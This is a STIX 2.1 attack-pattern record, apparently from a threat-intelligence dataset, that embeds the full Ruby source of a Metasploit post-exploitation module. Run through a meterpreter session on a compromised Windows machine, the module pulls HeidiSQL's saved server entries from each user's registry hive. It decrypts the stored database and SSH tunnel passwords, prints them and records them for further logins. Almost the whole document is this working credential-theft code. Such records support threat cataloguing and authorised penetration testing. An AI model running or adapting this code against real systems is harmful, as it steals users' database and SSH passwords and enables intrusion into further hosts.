{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--580c3b8f-a953-43ab-b896-d2fe8dccd516",
    "created": "2024-08-14T16:33:11.457874Z",
    "modified": "2024-08-14T16:33:11.457877Z",
    "name": "Windows Gather HeidiSQL Saved Password Extraction",
    "description": " This module extracts saved passwords from the HeidiSQL client. These passwords are stored in the registry. They are encrypted with a custom algorithm. This module extracts and decrypts these passwords.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/heidisql.rb",
            "external_id": "heidisql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather HeidiSQL Saved Password Extraction',\n        'Description' => %q{\n          This module extracts saved passwords from the HeidiSQL client. These\n          passwords are stored in the registry. They are encrypted with a custom algorithm.\n          This module extracts and decrypts these passwords.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['h0ng10'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def print_status(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def run\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      print_status(\"Looking at Key #{hive['HKU']}\")\n      begin\n        subkeys = registry_enumkeys(\"#{hive['HKU']}\\\\Software\\\\HeidiSQL\\\\Servers\")\n        if subkeys.blank?\n          print_status('HeidiSQL not installed for this user.')\n          next\n        end\n\n        service_types = {\n          0 => 'mysql',\n          1 => 'mysql-named-pipe',\n          2 => 'mysql-ssh',\n          3 => 'mssql-named-pipe',\n          4 => 'mssql',\n          5 => 'mssql-spx-ipx',\n          6 => 'mssql-banyan-vines',\n          7 => 'mssql-windows-rpc',\n          8 => 'postgres'\n        }\n\n        subkeys.each do |site|\n          site_key = \"#{hive['HKU']}\\\\Software\\\\HeidiSQL\\\\Servers\\\\#{site}\"\n          host = registry_getvaldata(site_key, 'Host') || ''\n          user = registry_getvaldata(site_key, 'User') || ''\n          port = registry_getvaldata(site_key, 'Port') || ''\n          db_type = registry_getvaldata(site_key, 'NetType') || ''\n          prompt = registry_getvaldata(site_key, 'LoginPrompt') || ''\n          ssh_user = registry_getvaldata(site_key, 'SSHtunnelUser') || ''\n          ssh_host = registry_getvaldata(site_key, 'SSHtunnelHost') || ''\n          ssh_port = registry_getvaldata(site_key, 'SSHtunnelPort') || ''\n          ssh_pass = registry_getvaldata(site_key, 'SSHtunnelPass') || ''\n          win_auth = registry_getvaldata(site_key, 'WindowsAuth') || ''\n          epass = registry_getvaldata(site_key, 'Password')\n\n          # skip if windows authentication is used (mssql only)\n          next if db_type.between?(3, 7) && (win_auth == 1)\n          next if epass.nil? || (epass == '') || (epass.length == 1) || (prompt == 1)\n\n          pass = decrypt(epass)\n          print_good(\"Service: #{service_types[db_type]} Host: #{host} Port: #{port} User: #{user}  Password: #{pass}\")\n\n          service_data = {\n            address: host == '127.0.0.1' ? rhost : host,\n            port: port,\n            service_name: service_types[db_type],\n            protocol: 'tcp',\n            workspace_id: myworkspace_id\n          }\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            private_type: :password,\n            private_data: pass,\n            username: user\n          }\n\n          credential_data.merge!(service_data)\n\n          # Create the Metasploit::Credential::Core object\n          credential_core = create_credential(credential_data)\n\n          # Assemble the options hash for creating the Metasploit::Credential::Login object\n          login_data = {\n            core: credential_core,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n\n          # Merge in the service data and create our Login\n          login_data.merge!(service_data)\n          login = create_credential_login(login_data)\n\n          # if we have a MySQL via SSH connection, we need to store the SSH credentials as well\n          next unless db_type == 2\n\n          print_good(\"Service: ssh Host: #{ssh_host} Port: #{ssh_port} User: #{ssh_user}  Password: #{ssh_pass}\")\n\n          service_data = {\n            address: ssh_host,\n            port: ssh_port,\n            service_name: 'ssh',\n            protocol: 'tcp',\n            workspace_id: myworkspace_id\n          }\n\n          credential_data = {\n            origin_type: :session,\n            session_id: session_db_id,\n            post_reference_name: refname,\n            private_type: :password,\n            private_data: ssh_pass,\n            username: ssh_user\n          }\n\n          credential_data.merge!(service_data)\n\n          # Create the Metasploit::Credential::Core object\n          credential_core = create_credential(credential_data)\n\n          # Assemble the options hash for creating the Metasploit::Credential::Login object\n          login_data = {\n            core: credential_core,\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }\n\n          # Merge in the service data and create our Login\n          login_data.merge!(service_data)\n          login = create_credential_login(login_data)\n        end\n      rescue ::Rex::Post::Meterpreter::RequestError => e\n        elog(e)\n        print_error(\"Cannot Access User SID: #{hive['HKU']} : #{e.message}\")\n      end\n    end\n    unload_our_hives(userhives)\n  end\n\n  def decrypt(encoded)\n    decoded = ''\n    shift = Integer(encoded[-1, 1])\n    encoded = encoded[0, encoded.length - 1]\n\n    hex_chars = encoded.scan(/../)\n    hex_chars.each do |entry|\n      x = entry.to_i(16) - shift\n      decoded += x.chr(::Encoding::UTF_8)\n    end\n\n    return decoded\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}